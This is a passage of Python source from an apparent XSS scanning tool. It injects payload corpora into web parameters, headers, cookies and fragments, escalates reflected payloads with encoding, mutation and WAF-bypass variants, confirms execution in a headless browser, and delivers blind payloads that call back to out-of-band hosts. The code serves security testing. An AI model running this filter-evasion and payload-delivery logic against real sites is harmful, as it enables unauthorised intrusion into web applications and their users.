        if len(result["candidates"]) >= 8 or state["bcount"][0] >= opts.browser_max:
            break
        value = P.canaryize(payload, token)
        state["bcount"][0] += 1
        shot = screenshot_path(opts, point, name)
        vr = browser_verify(point, value, token, shot, opts, state)
        entry = {
            "name": "fragment:" + name, "payload": payload, "value": value,
            "context": "fragment-" + point.name, "reflection": {"encoding": "dom"},
            "status": "LIKELY", "confidence": 60,
            "detail": "DOM payload delivered to fragment",
            "url": point.url + "#" + value, "body": "",
            "curl": "", "evidence": "", "screenshot": "",
        }
        _note_browser_issue(vr, state, entry)
        set_verification(entry, vr)
        if vr.get("hit"):
            entry["status"] = "CONFIRMED"
            entry["confidence"] = 95
            entry["detail"] = vr.get("detail")
            entry["screenshot"] = shot
            result["confirmed"] = True
            result["candidates"].append(entry)
            emit(c("    [CONFIRMED] fragment %s" % name, "green"))
            return result
        if vr.get("detail") and "no execution" not in vr.get("detail", ""):
            entry["detail"] = vr.get("detail")[:160]
        result["candidates"].append(entry)
    return result


def _scan_dom_point(point, opts, state, result):
    """Client-side fallback: the server did not reflect, but JS may read the URL."""
    if not (opts.browser and state.get("browser") and state.get("browser").available):
        return result
    token = state["token"]
    items = []
    for cat in ("dom", "polyglot", "html"):
        items.extend(P.PAYLOADS.get(cat, []))
    seen = set()
    for name, payload in items:
        if payload in seen:
            continue
        seen.add(payload)
        if len(result["candidates"]) >= 6 or state["bcount"][0] >= opts.browser_max:
            break
        value = P.canaryize(payload, token)
        state["bcount"][0] += 1
        shot = screenshot_path(opts, point, "dom-" + name)
        vr = browser_verify(point, value, token, shot, opts, state)
        if vr.get("blocked") or vr.get("error"):
            state.setdefault("browser_blocked" if vr.get("blocked") else "browser_error", [0])[0] += 1
        if vr.get("hit"):
            dom_entry = {
                "name": "dom:" + name, "payload": payload, "value": value,
                "context": "dom-client", "reflection": {"encoding": "dom"},
                "status": "CONFIRMED", "confidence": 95,
                "detail": vr.get("detail"), "url": point.url,
                "body": "", "curl": "", "evidence": "", "screenshot": shot,
            }
            set_verification(dom_entry, vr)
            result["candidates"].append(dom_entry)
            result["confirmed"] = True
            emit(c("    [CONFIRMED] dom fallback %s" % name, "green"))
            return result
    result["notes"].append("dom fallback: no client-side execution")
    return result


def _decoded_token(body, token):
    """Return decoder name if the canary appears only after decoding."""
    if not body or token in body:
        return None
    for name, got in P.decode_all(body[:200000]):
        if token in got:
            return name
    return None


def _escalate(ctx, point, base_payload, opts, state, result):
    """First-hit mode: mutate/encode/bypass the reflected payload until the
    browser proves execution. Returns True when a CONFIRMED hit was found."""
    token = state["token"]
    ctx_name = (ctx or {}).get("context") or "html"
    value0 = P.canaryize(base_payload, token)
    variants = []
    seen = set()

    def add(name, val):
        if not val or val in seen:
            return
        seen.add(val)
        variants.append((name, val))

    add("seed", base_payload)
    enc_names = list(opts.encode) if opts.encode else list(P.ENCODERS)
    # Encoders first: --auto supplies a profile-driven ladder (quote-less
    # canaries, alternate proof calls) that must be tried before generic
    # mutations, otherwise the attempt cap is consumed by cosmetic variants.
    enc_names = ([e for e in enc_names if e.startswith(("noquote", "alt-", "call-"))] +
                 [e for e in enc_names if not e.startswith(("noquote", "alt-", "call-"))])
    for en in enc_names:
        fn = P.ENCODERS.get(en)
        if not fn:
            continue
        if en == "b64doc" and ctx_name not in (
                "url", "attr_dq", "attr_sq", "attr_unquoted", "svg"):
            continue
        for src in (value0, base_payload):
            try:
                add("enc:%s" % en, fn(src))
            except Exception:
                pass
    if opts.mutate:
        for name, v in xf_mutate.mutate(base_payload, ctx_name, opts.mutate_max):
            add(name, v)
    if opts.bypass:
        for name, v in P.bypass_variants(base_payload, ctx_name, 0):
            add(name, v)

    if not opts.quiet:
        emit(c("    -> first-hit escalation: %d variants "
               "(encoders + bypass + mutations)" % len(variants), "magenta"))
    if not (opts.browser and state.get("browser") and state.get("browser").available):
        emit(c("    ! no browser proof: add --browser to confirm execution", "yellow"))

    tried = {c.get("value") for c in result.get("candidates") or []}
    cap = getattr(opts, "max_candidates", 500)
    attempt_cap = max(1, getattr(opts, "first_hit_max", 30))
    attempts = 0
    confirmed = False
    for name, raw in variants:
        if state["stop"].is_set():
            break
        if cap and len(result.get("candidates") or []) >= cap:
            break
        if attempts >= attempt_cap:
            if not opts.quiet:
                emit(c("    = first-hit cap reached (%d variants); raise "
                       "--first-hit-max to try more" % attempts, "dim"))
            break
        attempts += 1
        value = P.canaryize(raw, token)
        if value in tried:
            continue
        resp = send(state["factory"], state["limiter"], point, value, opts, count_block=False)
        if isinstance(resp, Exception):
            continue
        body = resp.text or ""
        dec = _decoded_token(body, token)
        if token not in body and not dec:
            continue
        reflection = analyze_reflection(body, value, token if token in body else value)
        if not reflection:
            reflection = {"encoding": dec or "encoded"}
        score = max(55, score_candidate(value, ctx, reflection))
        entry = {
            "name": "firsthit:" + name, "payload": raw, "value": value,
            "context": ctx_name,
            "reflection": reflection,
            "status": "LIKELY", "confidence": score,
            "detail": ("decoded by %s" % dec) if dec else
                      "%s reflection (%s)" % (reflection.get("encoding"), ctx_name),
            "url": xf_points.build_request(point, value, opts)[1],
            "body": "", "curl": xf_points.curl_repro(point, value, opts),
            "evidence": "", "screenshot": "",
        }
        tried.add(value)
        if (opts.browser and state.get("browser") and state.get("browser").available
                and state["bcount"][0] < opts.browser_max):
            state["bcount"][0] += 1
            shot = screenshot_path(opts, point, "firsthit_" + name.replace(":", "_"))
            vr = browser_verify(point, value, token, shot, opts, state)
            _note_browser_issue(vr, state, entry)
            set_verification(entry, vr)
            if vr.get("hit"):
                entry.update({"status": "CONFIRMED", "confidence": 95,
                              "detail": vr.get("detail"), "screenshot": shot})
                result["candidates"].append(entry)
                result["confirmed"] = True
                confirmed = True
                emit(c("    [EXPLOIT] %s -> %s" % (name, raw), "green"))
                break
            if vr.get("detail"):
                entry["detail"] += "; browser: " + vr["detail"][:120]
        result["candidates"].append(entry)
        if not opts.quiet:
            emit(c("    [!] %s (%s) %s" % (entry["status"], entry["confidence"], name), "yellow"))
    return confirmed


def run_deep_bypass(ctx, point, opts, state, result, seed):
    """Filter-aware generator loop: keep producing bypass variants until one
    is browser-proven or a budget is exhausted."""
    import time as _time
    profile = state.get("filter_profile") or {}
    started = _time.time()
    tried = {c.get("value") for c in result.get("candidates") or []}
    attempts = 0
    limit = max(1, getattr(opts, "bypass_max", 100))
    seconds = max(1.0, getattr(opts, "bypass_time", 300.0))
    # Deep mode needs far more browser proofs than the default budget (4).
    opts.browser_max = max(getattr(opts, "browser_max", 4), limit + 10)
    state["bcount"][0] = 0
    if not opts.quiet:
        blocked = ", ".join(profile.get("blocked") or []) or "none"
        emit(c("    -> deep bypass: seed=%r blocked=[%s] max=%d time=%.0fs" %
               (str(seed)[:70], blocked, limit, seconds), "magenta"))

    def try_variant(tag, variant):
        nonlocal attempts
        if attempts >= limit or (_time.time() - started) >= seconds or state["stop"].is_set():
            return False
        value = variant if "alert(1)" in variant else P.canaryize(variant, state["token"])
        if value in tried:
            return False
        tried.add(value)
        attempts += 1
        try:
            out = test_payload(ctx, point, "%s:%d" % (tag, attempts), variant, opts, state)
        except Exception as e:
            result["notes"].append("deep error: %s" % str(e)[:120])
            return False
        if not out:
            return False
        entry, confirmed = out
        result["candidates"].append(entry)
        if confirmed:
            result["confirmed"] = True
            emit(c("    [EXPLOIT][%s] %s" % (tag.upper(), (variant or "")[:160]), "green"))
            return True
        if not opts.quiet and attempts % 25 == 0:
            emit(c("    ... %d deep variants tried" % attempts, "dim"))
        return False

    # 1. First use relevant payloads from the web-derived corpus (or live web).
    attack = xf_seed.attack_type(point, opts)
    seed_pool = []
    if getattr(opts, "web_refresh", False):
        fresh = xf_seed.web_seeds(limit=max(20, getattr(opts, "seed_payloads", 20)))
        emit("web    : %d fresh payloads fetched" % len(fresh))
        seed_pool.extend(fresh)
    seed_pool.extend(xf_seed.candidate_seeds(
        attack, ctx, profile, getattr(opts, "seed_payloads", 20)))
    if seed_pool and not opts.quiet:
        emit(c("    -> %s: trying %d matched corpus payloads before generation" %
               (attack, len(seed_pool)), "cyan"))
    best_seed = seed
    for raw in seed_pool:
        if try_variant("seed", raw):
            return True
        if "alert(" in raw:
            best_seed = raw

    # 2. Only if corpus payloads fail, generate fresh variants from the seed.
    if not opts.quiet:
        emit(c("    -> corpus exhausted; generating fresh bypass variants", "magenta"))
    for variant in xf_gen.generate(best_seed, profile,
                                   (ctx or {}).get("context", "html"),
                                   limit=limit * 3, encoders=getattr(opts, "encode", None),
                                   facts=state.get("web_facts") or {}, attack=attack):
        if attempts >= limit or (_time.time() - started) >= seconds or state["stop"].is_set():
            if not opts.quiet:
                emit(c("    = deep bypass budget reached (%d variants, %.0fs)" %
                       (attempts, _time.time() - started), "dim"))
            break
        if try_variant("deep", variant):
            return True
    return False


def scan_point(point, opts, shared_state):
    token = "zq" + secrets.token_hex(5)
    state = dict(shared_state)
    state["token"] = token
    state["blocked"] = [0]
    result = {
        "point": point.label, "url": point.url, "method": point.method,
        "location": point.location, "param": point.name,
        "reflected": False, "context": None, "context_full": None,
        "candidates": [], "confirmed": False, "notes": [],
        "blind_confirmed": False, "blind_hits": [], "dom_findings": [],
        "csti_findings": [], "filter_fingerprint": None,
    }
    if (state.get("session") or {}).get("lost"):
        result["notes"].append("SESSION LOST (%s) — results unreliable" %
                               (state["session"].get("reason") or "auth expired"))
    prof = state.get("filter_profile")
    if prof:
        fingerprint = {
            "verdict": prof.get("verdict"),
            "blocked": list(prof.get("blocked") or []),
            "removed": list(prof.get("removed") or []),
            "escaped": dict(prof.get("escaped") or {}),
            "allowed": list(prof.get("allowed") or []),
            "waf": list(prof.get("waf") or []),
            "matrix": dict(prof.get("matrix") or {}),
        }
        for point_res in prof.get("points") or []:
            if point_res.get("point") == point.label:
                fingerprint["reflected"] = point_res.get("reflected")
                fingerprint["probes"] = point_res.get("probes")
                break
        result["filter_fingerprint"] = fingerprint
    if not opts.quiet:
        emit(c("[*] %s %s %s" % (point.method, point.location, point.name), "cyan"))
    if point.location == "fragment":
        return _scan_fragment(point, opts, state, result)
    resp = send(state["factory"], state["limiter"], point, token, opts)
    if isinstance(resp, Exception):
        result["notes"].append("request error: %s" % resp)
        emit(c("    ! %s" % str(resp)[:160], "red"))
        return result
    body = resp.text or ""
    base_status = resp.status_code
    if xf_waf.is_challenge(body, base_status):
        result["notes"].append("WAF/bot challenge page (canary echoed in interstitial, not a real reflection)")
        if not opts.quiet:
            emit(c("    - WAF challenge page — not a real reflection", "red"))
        return result
    csti = xf_csti.detect(body, token, opts)
    if csti:
        result["csti_findings"] = csti
        result["candidates"].extend(csti)
        result["reflected"] = True
        result["context"] = "csti"
        if not opts.quiet:
            emit(c("    + CSTI candidate: %s" % csti[0]["detail"], "yellow"))
    if token not in body and not csti:
        result["notes"].append("not reflected (HTTP %s, %d bytes)" % (base_status, len(body)))
        if not opts.quiet:
            emit(c("    - not reflected (HTTP %s)" % base_status, "dim"))
        if opts.dom_fallback and point.location in ("query", "form", "json"):
            _scan_dom_point(point, opts, state, result)
        _deliver_blind(point, opts, state, result)
        return result
    if token not in body:
        _deliver_blind(point, opts, state, result)
        return result

    ctx, idx = xf_context.classify(body, token)
    result["reflected"] = True
    if not result["context"]:
        result["context"] = ctx.get("context") if ctx else None
    result["context_full"] = ctx
    if not opts.quiet:
        extra = ""
        if ctx:
            extra = " tag=%s attr=%s" % (ctx.get("tag"), ctx.get("attr")) if ctx.get("attr") else (" tag=%s" % ctx.get("tag"))
        emit(c("    + reflected: %s%s" % (result["context"], extra), "green"))

    resp_ctype = (resp.headers.get("Content-Type") or "") if resp else ""
    if _non_executable_content_type(resp_ctype):
        result["notes"].append(
            "reflected in non-HTML response (%s) — not executable as XSS"
            % resp_ctype.split(";", 1)[0].strip())
        if not opts.quiet:
            emit(c("    - Content-Type %s is not HTML — skipping executable "
                   "corpus" % resp_ctype.split(";", 1)[0].strip(), "dim"))
        return result

    cands = result["candidates"]
    cand_cap = getattr(opts, "max_candidates", 500)
    # Once a handful of non-proven LIKELY candidates pile up in the SAME
    # context, more of the same add nothing — stop and escalate instead.
    likely_cap = 8
    likely_n = 0
    stop = False
    tried_n = 0
    bases = []
    base_cap = max(1, getattr(opts, "first_hit_bases", 3))
    for name, raw_payload in gather_payloads(ctx, opts):
        if state["stop"].is_set():
            break
        tried_n += 1
        if not opts.quiet and tried_n % 100 == 0:
            emit(c("    ... %d payloads tested on %s" % (tried_n, point.name), "dim"))
        try:
            out = test_payload(ctx, point, name, raw_payload, opts, state)
        except Exception as e:
            result["notes"].append("payload error %s: %s" % (name, str(e)[:120]))
            continue
        if not out:
            continue
        entry, confirmed = out
        cands.append(entry)
        if confirmed:
            result["confirmed"] = True
            emit(c("    [CONFIRMED] %s -> %s" % (name, entry["detail"][:120]), "green"))
            stop = True
            break
        emit(c("    [!] %s (%s) %s" % (entry["status"], entry["confidence"], name), "yellow"))
        if entry.get("status") == "LIKELY":
            likely_n += 1
            if likely_n >= likely_cap:
                if not opts.quiet:
                    emit(c("    = %d LIKELY in this context; stopping sweep, escalating" %
                           likely_n, "dim"))
                break
        if opts.first_hit:
            # A reflection without browser proof can be a false positive.
            # Keep it as a seed but keep sweeping for a proven hit.
            if len(bases) < base_cap:
                bases.append(entry.get("payload") or raw_payload)
                if not opts.quiet:
                    emit(c("    ~ no execution; keeping seed %d/%d (%s)" %
                           (len(bases), base_cap, name), "dim"))
            # Do NOT stop here: keep sweeping the corpus for a browser-proven
            # hit. Seeds are only a fallback when no payload proves execution.
        if cand_cap and len(cands) >= cand_cap:
            break
    if not stop and getattr(opts, "ai_fallback", False) and context_is_executable(ctx):
        blocked = "".join(sorted(xf_filter.blocked_chars(prof) if prof else set()))
        ai_payloads = xf_ai.generate(ctx, blocked, getattr(opts, "ai_model", ""),
                                     getattr(opts, "ai_count", 8), opts.timeout * 2)
        if ai_payloads:
            emit(c("    ai     : %d generated payload(s) from %s" %
                   (len(ai_payloads), xf_ai.default_model()), "magenta"))
        for ai_i, ai_raw in enumerate(ai_payloads):
            if state["stop"].is_set():
                break
            try:
                out = test_payload(ctx, point, "ai:%d" % ai_i, ai_raw, opts, state)
            except Exception as e:
                result["notes"].append("ai payload error: %s" % str(e)[:120])
                continue
            if not out:
                continue
            entry, confirmed = out
            cands.append(entry)
            if confirmed:
                result["confirmed"] = True
                emit(c("    [CONFIRMED] ai:%d -> %s" % (ai_i, entry["detail"][:100]), "green"))
                stop = True
                break
            emit(c("    [!] %s (%s) ai:%d" % (entry["status"], entry["confidence"], ai_i), "yellow"))
    sess = state.get("session") or {}
    if sess.get("lost"):
        result["notes"].append("SESSION LOST mid-scan (%s) — results unreliable"
                               % sess.get("reason", "auth expired"))
    if opts.first_hit and not bases and state["blocked"][0] > 0:
        # WAF blocked every executable payload before one could reflect; use the
        # strongest corpus vector as the escalation seed instead.
        for _n, _p in gather_payloads(ctx, opts):
            if P.looks_executable(_p):
                bases.append(_p)
                break
        if bases and not opts.quiet:
            emit(c("    ! all executable payloads blocked (%d) — escalating "
                   "from corpus vector anyway" % state["blocked"][0], "yellow"))
    if opts.first_hit and not stop:
        # The corpus pass consumes the browser budget; give escalation a fresh
        # one so the profile-driven ladder can actually be proven in-browser.
        state["bcount"][0] = 0
        if not opts.quiet and tried_n > 1:
            emit(c("    -> no proven hit in %d payloads; escalating %d seed(s) "
                   "with encoders/bypass/mutations" % (tried_n, len(bases)), "magenta"))
        for seed in bases:
            if not opts.quiet:
                emit(c("    -> escalating seed: %s" % (seed or "")[:110], "magenta"))
            stop = _escalate(ctx, point, seed, opts, state, result)
            if stop:
                break
    if not stop and opts.deep_bypass:
        seed = opts.bypass_seed
        if not seed:
            for cand in result.get("candidates") or []:
                if cand.get("payload"):
                    seed = cand["payload"]
                    break
        if not seed:
            for _n, _p in gather_payloads(ctx, opts):
                if P.looks_executable(_p):
                    seed = _p
                    break
        if seed:
            stop = run_deep_bypass(ctx, point, opts, state, result, seed)
    if not stop and opts.quiet is False:
        emit(c("    = first pass: %d payloads tried, %d candidates" %
               (tried_n, len(cands)), "dim"))
    # First-hit mode already ran a broader encoder/bypass/mutation escalation;
    # re-running the generic passes would duplicate work and waste browser time.
    if not stop and not opts.first_hit and opts.mutate and context_is_executable(ctx):
        stop = _test_mutations(ctx, point, opts, state, result)
    if not stop and not opts.first_hit and (opts.encode or state["blocked"][0] > 0):
        stop = _test_encoded(ctx, point, opts, state, result)
    if not stop and (getattr(opts, "hpp", False) or getattr(opts, "structural", False)):
        stop = _test_structural(ctx, point, opts, state, result)
    result["candidates"] = cands
    blocked_delta = state["blocked"][0]
    if blocked_delta:
        shared_state["blocked"][0] += blocked_delta
        result["notes"].append(
            "%d payload(s) blocked by WAF/filter — try --encode all or --all" % blocked_delta)
    if not stop and not opts.quiet:
        emit(c("    = no confirmed execution (%d payloads tried, %d candidates)" %
               (tried_n, len(cands)), "dim"))
    _deliver_blind(point, opts, state, result)
    return result


def _test_mutations(ctx, point, opts, state, result):
    """Second pass: derive fresh WAF-evasion variants from strong vectors."""
    bases = [it for it in gather_payloads(ctx, opts) if P.looks_executable(it[1])]
    base_n = max(1, int(getattr(opts, "mutate_base", 4)))
    per = max(1, int(getattr(opts, "mutate_max", 24)))
    ctx_name = (ctx or {}).get("context") or "html"
    tried = {c.get("value") for c in result.get("candidates") or []}
    variants = []
    seen = set()
    for _, raw in bases[:base_n]:
        for name, mutated in xf_mutate.mutate(raw, ctx_name, per):
            if mutated in seen:
                continue
            seen.add(mutated)
            variants.append((name, mutated))
        if getattr(opts, "bypass", False) and getattr(opts, "bypass_variants", 0) > 0:
            for name, variant in P.bypass_variants(
                    raw, ctx_name, opts.bypass_variants):
                if variant in seen:
                    continue
                seen.add(variant)
                variants.append((name, variant))
    if not variants:
        return False
    if not opts.quiet:
        emit(c("    ~ %d mutation variants (WAF evasion pass)" % len(variants), "cyan"))
    cand_cap = getattr(opts, "max_candidates", 500)
    for name, raw in variants:
        if state["stop"].is_set() or (cand_cap and len(result.get("candidates") or []) >= cand_cap):
            break
        if P.canaryize(raw, state["token"]) in tried:
            continue
        try:
            out = test_payload(ctx, point, name, raw, opts, state)
        except Exception as e:
            result["notes"].append("mutate error %s: %s" % (name, str(e)[:120]))
            continue
        if not out:
            continue
        entry, confirmed = out
        tried.add(entry.get("value"))
        result["candidates"].append(entry)
        if confirmed:
            result["confirmed"] = True
            emit(c("    [CONFIRMED] %s -> %s" % (name, entry["detail"][:120]), "green"))
            return True
        emit(c("    [!] %s (%s) %s" % (entry["status"], entry["confidence"], name), "yellow"))
    return False


def _test_structural(ctx, point, opts, state, result):
    pool = gather_payloads(ctx, opts)
    bases = [it for it in pool if "__HPP__" in it[1] or P.looks_executable(it[1])]
    preferred = [it for it in bases if it[0].startswith("gap:")]
    bases = (preferred + [it for it in bases if it not in preferred])[:6]
    seen = set()
    tried = 0
    cand_cap = getattr(opts, "max_candidates", 500)
    for name, raw in bases:
        value = P.canaryize(raw, state["token"])
        for variant_name, variant_point, variant_value in xf_struct.all_variants(
                point, value, opts):
            if state["stop"].is_set() or tried >= 24:
                break
            if cand_cap and len(result.get("candidates") or []) >= cand_cap:
                break
            key = (variant_point.location, variant_point.name, variant_value,
                   tuple(sorted((variant_point.meta or {}).items())))
            if key in seen:
                continue
            seen.add(key)
            tried += 1
            label = "%s:%s" % (name, variant_name)
            try:
                out = test_payload(ctx, variant_point, label, variant_value,
                                   opts, state)
            except Exception as e:
                result["notes"].append("structural error %s: %s" %
                                       (label, str(e)[:120]))
                continue
            if not out:
                continue
            entry, confirmed = out
            result["candidates"].append(entry)
            if confirmed:
                result["confirmed"] = True
                emit(c("    [CONFIRMED] %s -> %s" %
                       (label, entry["detail"][:120]), "green"))
                return True
            emit(c("    [!] %s (%s) %s" %
                   (entry["status"], entry["confidence"], label), "yellow"))
    return False


def _test_encoded(ctx, point, opts, state, result):
    encoders = list(opts.encode)
    if not encoders:
        encoders = ["url", "html-dec", "html-hex", "js-unicode", "fullwidth",
                    "utf7", "zwsp", "mixed"]
    pool = gather_payloads(ctx, opts)
    waf_first = [it for it in pool if it[0].startswith(("waf:", "firewall:"))
                 and P.looks_executable(it[1])]
    bases = (waf_first + [it for it in pool if P.looks_executable(it[1])])[:opts.encode_max]
    for name, raw in bases:
        value = P.canaryize(raw, state["token"])
        for en in encoders:
            if en not in P.ENCODERS:
                continue
            if en == "b64doc" and (ctx or {}).get("context") not in (
                    "url", "attr_dq", "attr_sq", "attr_unquoted", "svg"):
                continue
            try:
                enc = P.ENCODERS[en](value)
            except Exception:
                continue
            resp = send(state["factory"], state["limiter"], point, enc, opts, count_block=False)
            if isinstance(resp, Exception):
                continue
            body = resp.text or ""
            raw_seen = bool(value) and value in body
            enc_seen = enc in body
            if not raw_seen and not enc_seen:
                continue
            has_browser = bool(opts.browser and state.get("browser")
                               and state.get("browser").available
                               and state["bcount"][0] < opts.browser_max)
            # A literal encoded echo is only meaningful if a browser can decode
            # it in-page; without the oracle it would be a false positive.
            if not raw_seen and not has_browser:
                continue
            reflection = analyze_reflection(body, value if raw_seen else enc,
                                            state["token"])
            entry = {
                "name": "enc:%s:%s" % (en, name), "payload": raw, "value": enc,
                "context": (ctx or {}).get("context"),
                "reflection": reflection or {"encoding": "encoded"},
                "status": "LIKELY" if raw_seen else "REFLECTED",
                "confidence": 65 if raw_seen else 45,
                "detail": ("server decoded encoded payload" if raw_seen
                           else "encoded payload reflected; browser proof required"),
                "url": xf_points.build_request(point, enc, opts)[1],
                "body": "", "curl": xf_points.curl_repro(point, enc, opts),
                "evidence": "", "screenshot": "",
            }
            if has_browser:
                state["bcount"][0] += 1
                shot = screenshot_path(opts, point, "enc_" + en)
                vr = browser_verify(point, enc, state["token"], shot, opts, state)
                _note_browser_issue(vr, state, entry)
                set_verification(entry, vr)
                if vr.get("hit"):
                    entry["status"] = "CONFIRMED"
                    entry["confidence"] = 95
                    entry["detail"] = vr.get("detail")
                    entry["screenshot"] = shot
                    result["candidates"].append(entry)
                    result["confirmed"] = True
                    emit(c("    [CONFIRMED] %s" % entry["name"], "green"))
                    return True
                if not raw_seen:
                    continue
            result["candidates"].append(entry)
            emit(c("    [~] encoded variant: %s (%s)" %
                   (en, "decoded" if raw_seen else "literal"), "cyan"))
    return False


def _deliver_blind(point, opts, state, result):
    base = state.get("oob_base") or opts.blind
    ish = state.get("interactsh")
    if not base and not (ish and ish.available):
        return
    token = state["token"]
    if ish and ish.available:
        cb_token = ish.new_flag()
        cb = ish.url_for(cb_token)
        result["oob_token"] = cb_token
        result["oob_provider"] = "interactsh"
    elif state.get("collab"):
        cb_token = state["collab"].new_token("b")
        cb = state["collab"].url_for(cb_token)
        result["oob_token"] = cb_token
        result["oob_provider"] = "collaborator"
    else:
        cb_token = "b" + secrets.token_hex(6)
        cb = base.rstrip("/") + "/" + cb_token
        result["oob_token"] = cb_token
        result["oob_provider"] = "external"
    delivered = 0
    for name, blind in P.BLIND_PAYLOADS:
        val = blind.replace("__CB__", cb)
        r = send(state["factory"], state["limiter"], point, val, opts, count_block=False)
        if not isinstance(r, Exception):
            delivered += 1
    if delivered:
        result["notes"].append("blind payloads delivered (%d) to %s" % (delivered, cb))


# ---------------------------------------------------------------------------
# Discovery
# ---------------------------------------------------------------------------

def _dedupe_points(points):
    out = []
    seen = set()
    for p in points:
        sig = p.signature()
        if sig in seen:
            continue
        seen.add(sig)
        out.append(p)
    return out


def discover(opts, factory, limiter, state):
    points = []
    if opts.raw_request:
        raw = open(opts.raw_request, encoding="utf-8", errors="replace").read()
        parsed, headers, body = xf_points.parse_raw_request(
            raw, scheme=opts.scheme, base_host=opts.headers.get("Host", ""))
        if not parsed:
            raise SystemExit("could not parse raw request")
        opts.url = opts.url or parsed["url"]
        if parsed["method"]:
            opts.method = parsed["method"]
        extra = {k: v for k, v in parsed["headers"]
                 if k.lower() not in ("host", "content-length", "cookie")}
        opts.headers.update(extra)
        ck = dict(parsed["headers"]).get("Cookie") or dict(
            (k.lower(), v) for k, v in parsed["headers"]).get("cookie")
        if ck:
            opts.cookie = ck
        points.extend(xf_points.points_from_raw_request(parsed, opts.params or None))
        points.extend(xf_points.points_from_headers(parsed["url"], opts.inject_headers))
        if opts.inject_cookies:
            ckmap = {}
            for part in (ck or "").split(";"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    ckmap[k.strip()] = v.strip()
            for cn in opts.inject_cookies:
                p = xf_points.Point(label="cookie:%s" % cn, method=opts.method or "GET",
                                    url=parsed["url"], location="cookie", name=cn,
                                    data={}, meta={"cookies": ckmap})
                points.append(p)
        if opts.path:
            points.extend(xf_points.points_from_path(parsed["url"]))
        if opts.fragment and "#" in parsed["url"]:
            points.extend(xf_points.points_from_fragment(parsed["url"]))
    else:
        if opts.data:
            points.extend(xf_points.points_from_data(opts.url, opts.data,
                                                     opts.method or "POST", opts.params or None))
        else:
            points.extend(xf_points.points_from_url(opts.url, opts.params or None))
        points.extend(xf_points.points_from_headers(opts.url, opts.inject_headers))
        for cn in opts.inject_cookies:
            ckmap = {}
            for part in opts.cookie.split(";"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    ckmap[k.strip()] = v.strip()
            points.append(xf_points.Point(
                label="cookie:%s" % cn, method="GET", url=opts.url,
                location="cookie", name=cn, data={}, meta={"cookies": ckmap}))
        if opts.path:
            points.extend(xf_points.points_from_path(opts.url))
        if opts.fragment:
            if "#" in opts.url:
                points.extend(xf_points.points_from_fragment(opts.url))
            else:
                points.append(xf_points.Point(
                    label="fragment", method="GET", url=opts.url,
                    location="fragment", name="fragment", data={}))

    if getattr(opts, "header_sweep", False):
        names = xf_inject.sweep_headers(opts)
        points.extend(xf_points.points_from_headers(opts.url, names))
        if not opts.quiet:
            emit("headers: sweep %d headers" % len(names))
    if getattr(opts, "cookie_sweep", False):
        names = xf_inject.sweep_cookies(opts)
        cmap = xf_inject.cookie_map(opts)
        for cp in xf_points.points_from_cookies(opts.url, names):
            cp.meta["cookies"] = cmap
            points.append(cp)
        if not opts.quiet:
            emit("cookies: sweep %d cookies" % len(names))
    if getattr(opts, "param_mine", False) and opts.url:
        try:
            limiter.wait()
            page = factory.get().get(opts.url, timeout=opts.timeout,
                                     verify=not opts.insecure)
            extra = xf_inject.load_wordlist(opts.param_wordlist, opts.timeout,
                                            opts.insecure)
            names = xf_inject.mine_names(page.text or "", extra)
            names = names[:max(1, opts.param_mine_max)]
            mined = xf_inject.mine_points(opts.url, page.text or "", names,
                                          opts.params or None)
            points.extend(mined)
            if not opts.quiet:
                emit("params : mined %d names from page/JS%s" %
                     (len(names), " + wordlist" if extra else ""))
        except Exception as e:
            if not opts.quiet:
                emit(c("params : mining failed: %s" % str(e)[:120], "yellow"))
    if getattr(opts, "postman", ""):
        spec = xf_import.load_json(opts.postman, opts.timeout, opts.insecure)
        got = xf_import.postman_points(spec, opts.params or None)
        points.extend(got)
        if not opts.quiet:
            emit("postman: %d points from %s" % (len(got), opts.postman))
    if getattr(opts, "har_file", ""):
        spec = xf_import.load_json(opts.har_file, opts.timeout, opts.insecure)
        got = xf_import.har_points(spec, opts.params or None)
        points.extend(got)
        if not opts.quiet:
            emit("har    : %d points from %s" % (len(got), opts.har_file))

    if opts.crawl:
        crawler = xf_crawl.Crawler(factory.get(), opts)
        found = crawler.run([opts.url])
        if not opts.quiet:
            emit("crawl  : %d urls, %d forms" % (len(found["urls"]), len(found["forms"])))
        for u in found["urls"]:
            points.extend(xf_points.points_from_url(u, opts.params or None))
        for form in found["forms"]:
            base = {}
            for k, v in form["fields"]:
                base.setdefault(k, v)
            seen_fields = set()
            for k, _ in form["fields"]:
                if opts.params and k not in opts.params:
                    continue
                if k in seen_fields:
                    continue
                seen_fields.add(k)
                pts = xf_points.points_from_data(
                    form["action"],
                    urlencode(base), form["method"], [k])
                for p in pts:
                    p.label = "form:%s:%s" % (form["method"], k)
                    points.append(p)
    if opts.openapi:
        try:
            spec = xf_openapi.load_spec(opts.openapi, timeout=opts.timeout,
                                        insecure=opts.insecure)
        except Exception as e:
            spec = None
            emit(c("openapi: load failed: %s" % str(e)[:160], "yellow"))
        if spec:
            api_pts = xf_openapi.points_from_spec(spec, base_url=opts.url,
                                                  only_params=opts.params or None)
            points.extend(api_pts)
            if not opts.quiet:
                emit("openapi: %d points from spec" % len(api_pts))
        elif not opts.quiet:
            emit(c("openapi: no usable spec at %s" % opts.openapi, "yellow"))

    if opts.dom_fuzz and opts.url and not any(p.location == "fragment" for p in points):
        base = opts.url.split("#", 1)[0]
        points.append(xf_points.Point(label="fragment", method="GET", url=base,
                                      location="fragment", name="fragment", data={}))
    return _dedupe_points(points)


# ---------------------------------------------------------------------------
# DOM analysis
# ---------------------------------------------------------------------------

def run_dom_analysis(opts, factory, limiter, urls=None, csp=None):
    findings = []
    targets = []
    for u in (urls or [opts.url]):
        base = u.split("#", 1)[0]
        if base and base not in targets:
            targets.append(base)
    targets = targets[:20]

    def fetch(url):
        r = factory.get().get(url, timeout=opts.timeout, verify=not opts.insecure)
        return r.text or ""

    for url in targets:
        try:
            html = fetch(url)
        except Exception as e:
            return findings, "fetch error: %s" % e
        try:
            got = xf_dom.analyze_page(html, url, fetch)
        except Exception:
            got = []
        for f in got:
            key = (f.get("sink"), f.get("source"), f.get("script"))
            if any((g.get("sink"), g.get("source"), g.get("script")) == key
                   for g in findings):
                continue
            findings.append(f)
    suppressed = []
    if csp and csp.get("present"):
        findings, suppressed = xf_csp.filter_dom_findings(findings, csp)
    if suppressed:
        emit(c("dom    : %d static finding(s) suppressed by Trusted Types" %
               len(suppressed), "dim"))
    return findings, ""


def verify_dom_findings(opts, state, findings, url, label="dom"):
    """Attempt harmless in-browser proof of static DOM source->sink findings.

